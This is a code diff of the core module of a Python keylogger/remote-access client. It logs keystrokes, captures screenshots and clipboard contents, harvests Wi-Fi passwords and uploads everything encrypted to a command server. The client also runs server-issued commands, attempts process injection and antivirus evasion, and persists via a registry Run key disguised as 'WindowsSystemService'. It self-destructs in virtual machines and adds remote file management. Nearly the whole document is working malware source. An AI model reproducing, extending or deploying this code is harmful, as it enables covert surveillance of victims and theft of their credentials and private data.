@@ -24,6 +24,7 @@ import os
 from system.vm_detector import VMDetector
 from monitoring.rdp_controller import RDPController
 from system.anti_av import AntiAV
+from system.file_manager import FileManager
 
 # Configure logging based on DEBUG_MODE
 if Config.DEBUG_MODE:
@@ -45,7 +46,7 @@ class KeyloggerCore:
             if Config.DEBUG_MODE:
                 logging.basicConfig(
                     level=logging.DEBUG,
-                    format="%(asctime)s - %(levelname)s - %(message)s",
+                    format='%(asctime)s - %(levelname)s - %(message)s',
                     handlers=[
                         logging.FileHandler("keylogger.log", encoding="utf-8"),
                         logging.StreamHandler(sys.stdout),
@@ -58,6 +59,7 @@ class KeyloggerCore:
             self.communicator = ServerCommunicator(self.client_id, self.encryption)
             self.logger = ActivityLogger(Config.BUFFER_LIMIT)
             self.rdp_controller = RDPController(self.encryption)
+            self.file_manager = FileManager(self.encryption, self.communicator)
             self.running = True
             self.anti_av = AntiAV()
             self.behavior = {
@@ -66,12 +68,13 @@ class KeyloggerCore:
                 "process_injection_enabled": True,
                 "rdp_enabled": True,
                 "persistence_enabled": True,
-                "wifi_passwords_enabled": True
+                "wifi_passwords_enabled": True,
+                "file_management_enabled": True
             }
 
             self.adjust_behavior_based_on_antivirus()
 
-            if not Config.TEST_MODE:  # Skip dangerous operations in test mode
+            if not Config.TEST_MODE:
                 if platform.system().lower() == "windows" and not Config.DEBUG_MODE and self.behavior["process_injection_enabled"]:
                     self.attempt_process_injection()
 
@@ -151,12 +154,11 @@ class KeyloggerCore:
             if version.parse(server_version) > version.parse(Config.CLIENT_VERSION):
                 if Config.DEBUG_MODE:
                     logging.info(f"New version {server_version} available. Downloading from {download_url}")
-                if not Config.TEST_MODE:  # Skip update in test mode
+                if not Config.TEST_MODE:
                     self.update_client(download_url, server_version)
             else:
                 if Config.DEBUG_MODE:
                     logging.info("Client is up-to-date.")
-
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Update check error: {str(e)}")
@@ -184,13 +186,13 @@ class KeyloggerCore:
             batch_file = "update.bat"
 
             batch_content = f"""
-            @echo off
-            ping 127.0.0.1 -n 2 > nul
-            del /F /Q "{current_exe}"
-            move /Y "{new_exe_path}" "{current_exe}"
-            start "" "{current_exe}"
-            del /F /Q "%~f0"
-            """
+@echo off
+ping 127.0.0.1 -n 2 > nul
+del /F /Q "{current_exe}"
+move /Y "{new_exe_path}" "{current_exe}"
+start "" "{current_exe}"
+del /F /Q %~f0
+"""
             with open(batch_file, 'w', encoding='utf-8') as f:
                 f.write(batch_content)
 
@@ -213,11 +215,11 @@ class KeyloggerCore:
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Failed to upload VM status: {str(e)}")
-        if not Config.TEST_MODE and vm_details["is_vm"] and not Config.DEBUG_MODE:  # Skip self-destruct in test mode
+        if not Config.TEST_MODE and vm_details['is_vm'] and not Config.DEBUG_MODE:
             if Config.DEBUG_MODE:
                 logging.warning("Virtual Machine detected. Initiating self-destruct.")
             self.self_destruct()
-        elif Config.DEBUG_MODE and vm_details["is_vm"]:
+        elif Config.DEBUG_MODE and vm_details['is_vm']:
             logging.warning("Virtual Machine detected, but self-destruct skipped in debug mode.")
 
     def self_destruct(self):
@@ -231,7 +233,7 @@ class KeyloggerCore:
             except Exception as e:
                 if Config.DEBUG_MODE:
                     logging.error(f"Failed to send self-destruct report: {str(e)}")
-            if not Config.TEST_MODE:  # Skip file deletion in test mode
+            if not Config.TEST_MODE:
                 self.remove_from_startup()
                 self.cleanup_files()
                 self.delete_executable()
@@ -286,12 +288,12 @@ class KeyloggerCore:
             exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
             batch_file = "self_destruct.bat"
             batch_content = f"""
-            @echo off
-            ping 127.0.0.1 -n 2 > nul
-            del /F /Q "{exe_path}"
-            del /F /Q "%~f0"
-            """
-            with open(batch_file, "w", encoding="utf-8") as f:
+@echo off
+ping 127.0.0.1 -n 2 > nul
+del /F /Q "{exe_path}"
+del /F /Q %~f0
+"""
+            with open(batch_file, 'w', encoding='utf-8') as f:
                 f.write(batch_content)
             subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
             if Config.DEBUG_MODE:
@@ -303,184 +305,120 @@ class KeyloggerCore:
     def emergency_stop(self):
         self.running = False
         if Config.DEBUG_MODE:
-            logging.error("Emergency stop initiated")
-        if not Config.TEST_MODE:  # Skip self-destruct in test mode
+            logging.info("Emergency stop activated")
+        if not Config.TEST_MODE:
             self.self_destruct()
 
     def start(self):
-        self._init_hotkeys()
-        self._start_service_threads()
-        self._main_loop()
+        try:
+            if Config.DEBUG_MODE:
+                logging.info("Starting keylogger core...")
+            if self.behavior["keylogging_enabled"]:
+                hook(self.logger.log_key)
+                if Config.DEBUG_MODE:
+                    logging.info("Keylogging enabled")
+            if self.behavior["persistence_enabled"]:
+                add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
+                if Config.DEBUG_MODE:
+                    logging.info(f"Emergency hotkey set: {Config.EMERGENCY_HOTKEY}")
+
+            system_info = SystemCollector.get_system_info()
+            if Config.DEBUG_MODE:
+                logging.info(f"Collected system info: {system_info}")
+
+            threading.Thread(target=self.command_listener, daemon=True).start()
+            threading.Thread(target=self.upload_logs, daemon=True).start()
+            threading.Thread(target=self.screenshot_monitor, daemon=True).start()
+
+            if self.behavior["rdp_enabled"]:
+                self.rdp_controller.start_rdp()
+                if Config.DEBUG_MODE:
+                    logging.info("RDP controller started")
+
+            if Config.DEBUG_MODE:
+                logging.info("Keylogger core started successfully")
+            while self.running:
+                time.sleep(1)
+
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Start error: {str(e)}")
+            self.emergency_stop()
+
+    def command_listener(self):
+        try:
+            command_handler = CommandHandler(self.communicator, self.encryption, self.file_manager)
+            while self.running:
+                try:
+                    commands = self.communicator.get_commands()
+                    for cmd in commands:
+                        if Config.DEBUG_MODE:
+                            logging.info(f"Received command: {cmd}")
+                        command_handler.execute_command(cmd)
+                except CommunicationError as e:
+                    if Config.DEBUG_MODE:
+                        logging.error(f"Command listener error: {str(e)}")
+                except CommandError as e:
+                    if Config.DEBUG_MODE:
+                        logging.error(f"Command execution error: {str(e)}")
+                time.sleep(Config.COMMAND_POLL_INTERVAL)
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Command listener critical error: {str(e)}")
+            self.emergency_stop()
+
+    def upload_logs(self):
+        while self.running:
+            try:
+                logs = self.logger.get_logs()
+                if logs:
+                    if Config.DEBUG_MODE:
+                        logging.info(f"Uploading {len(logs)} logs")
+                    self.communicator.upload_logs(logs)
+                    self.logger.clear_logs()
+            except Exception as e:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Log upload error: {str(e)}")
+            time.sleep(Config.CHECK_INTERVAL)
+
+    def screenshot_monitor(self):
+        while self.running:
+            try:
+                if self.behavior["screenshot_enabled"]:
+                    screenshot = pyautogui.screenshot()
+                    img = Image.frombytes('RGB', screenshot.rgb.shape[:2], screenshot.rgb)
+                    img_byte_arr = io.BytesIO()
+                    img.save(img_byte_arr, format='PNG')
+                    screenshot_data = img_byte_arr.getvalue()
+                    encrypted_data = self.encryption.encrypt(screenshot_data)
+                    if Config.DEBUG_MODE:
+                        logging.info("Captured and encrypted screenshot")
+                    self.communicator.upload_screenshot(encrypted_data)
+            except Exception as e:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Screenshot monitor error: {str(e)}")
+            time.sleep(Config.CHECK_INTERVAL)
 
     def add_to_startup(self):
-        import os
-        import winreg
-        import platform
-        if platform.system().lower() != 'windows':
+        if platform.system().lower() != "windows":
             if Config.DEBUG_MODE:
-                logging.info("Startup registration only supported on Windows")
+                logging.info("Startup persistence only supported on Windows")
             return
         try:
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            app_name = "WindowsSystemService"
             exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
-            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
-                winreg.SetValueEx(key, "KeyloggerClient", 0, winreg.REG_SZ, exe_path)
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as reg_key:
+                winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, exe_path)
             if Config.DEBUG_MODE:
-                logging.info("Added to registry startup")
+                logging.info("Added to startup registry")
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Failed to add to startup: {str(e)}")
 
-    def _init_hotkeys(self):
-        add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
-        hook(self.logger.log_keystroke)
-
-    def _start_service_threads(self):
-        threading.Thread(target=self._data_sync_loop, daemon=True).start()
-        threading.Thread(target=self._command_loop, daemon=True).start()
-        threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()
-        if self.behavior["wifi_passwords_enabled"]:
-            threading.Thread(target=self._wifi_passwords_loop, daemon=True).start()
-
-    def _wifi_passwords_loop(self):
-        while True:
-            try:
-                if self.behavior["wifi_passwords_enabled"]:
-                    from commands.handler import CommandHandler
-                    wifi_data = CommandHandler.handle_wifi_passwords({})
-                    if wifi_data.get("status") == "success" and wifi_data.get("wifi_profiles"):
-                        self.communicator.upload_wifi_passwords(wifi_data)
-                        if Config.DEBUG_MODE:
-                            logging.info("Wi-Fi passwords uploaded successfully")
-            except Exception as e:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Wi-Fi passwords loop error: {str(e)}")
-            time.sleep(3600)
-
-    def _capture_screenshot(self):
-        try:
-            screenshot = pyautogui.screenshot()
-            img_byte_arr = io.BytesIO()
-            screenshot.save(img_byte_arr, format='PNG')
-            return img_byte_arr.getvalue()
-        except Exception as e:
-            if Config.DEBUG_MODE:
-                logging.error(f"Screenshot capture error: {str(e)}")
-            return None
-
-    def _data_sync_loop(self):
-        while self.running:
-            try:
-                if Config.DEBUG_MODE:
-                    logging.info("Starting data sync...")
-                system_info = SystemCollector.collect_full()
-                if Config.DEBUG_MODE:
-                    logging.info(f"Collected system info: {system_info}")
-                screenshot = self._capture_screenshot()
-                self.communicator.upload_data(
-                    keystrokes=self.logger.buffer.copy(),
-                    system_info=system_info,
-                    screenshot=screenshot
-                )
-                if Config.DEBUG_MODE:
-                    logging.info("Data sync completed")
-                self.logger.buffer.clear()
-                if Config.DEBUG_MODE:
-                    logging.info(f"Sleeping for {Config.CHECK_INTERVAL} seconds")
-                time.sleep(Config.CHECK_INTERVAL)
-            except Exception as e:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Sync error: {str(e)}")
-                time.sleep(5)
-
-    def _command_loop(self):
-        while self.running:
-            try:
-                if Config.DEBUG_MODE:
-                    logging.info("Fetching commands from server...")
-                commands = self.communicator.fetch_commands()
-                if Config.DEBUG_MODE:
-                    logging.info(f"Received {len(commands)} commands: {commands}")
-                if commands:
-                    self._process_commands(commands)
-                time.sleep(Config.COMMAND_POLL_INTERVAL)
-            except Exception as e:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Command processing error: {str(e)}")
-                time.sleep(5)
-
-    def _clipboard_monitor_loop(self):
-        while self.running:
-            try:
-                self.logger.log_clipboard()
-                time.sleep(10)
-            except Exception as e:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Clipboard monitor error: {str(e)}")
-
-    def _process_commands(self, commands):
-        for cmd in commands:
-            try:
-                if Config.DEBUG_MODE:
-                    logging.info(f"Processing command: ID={cmd['id']}, Type={cmd['type']}")
-                if not all(k in cmd for k in ('id', 'command', 'type')):
-                    raise CommandError(f"Invalid command structure: {cmd}")
-    
-                if Config.DEBUG_MODE:
-                    logging.info("Starting decryption")
-                decrypted = self.encryption.decrypt(cmd['command'])
-                if Config.DEBUG_MODE:
-                    logging.info("Decryption successful")
-                    logging.info(f"Decrypted command: {decrypted}")
-                command_data = json.loads(decrypted)
-                if Config.DEBUG_MODE:
-                    logging.info(f"Parsed command data: {command_data}")
-    
-                if 'type' not in command_data:
-                    raise CommandError(f"Missing 'type' in decrypted command: {command_data}")
-    
-                if Config.DEBUG_MODE:
-                    logging.info(f"Command received - Type: {command_data['type']}, Params: {command_data.get('params', {})}")
-                
-                result = CommandHandler.execute(
-                    command_data['type'],
-                    command_data.get('params', {})
-                )
-                
-                if Config.DEBUG_MODE:
-                    logging.info(f"Command executed successfully: {command_data['type']}, Result: {result}")
-                self.communicator.send_command_result(cmd['id'], result)
-    
-            except (KeyError, json.JSONDecodeError) as e:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Invalid command format: {str(e)}, Command: {cmd}")
-            except CommandError as e:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Command error: {str(e)}, Command: {cmd}")
-            except CommunicationError as e:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Communication error: {str(e)}, Command: {cmd}")
-            except Exception as e:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Command execution failed: {str(e)}, Command: {cmd}")
-
-    def _handle_error(self, message):
-        if Config.DEBUG_MODE:
-            logging.error(message)
-
-    def emergency_stop(self):
-        self.running = False
-        if Config.DEBUG_MODE:
-            logging.info("Emergency stop activated")
-        sys.exit(0)
-
-    def _main_loop(self):
-        try:
-            while self.running:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            self.emergency_stop()
-
 if __name__ == "__main__":
-    keylogger = KeyloggerCore()
-    keylogger.start()
+    if Config.TEST_MODE:
+        print("Test mode enabled: Skipping actual execution.")
+    else:
+        keylogger = KeyloggerCore()
+        keylogger.start()
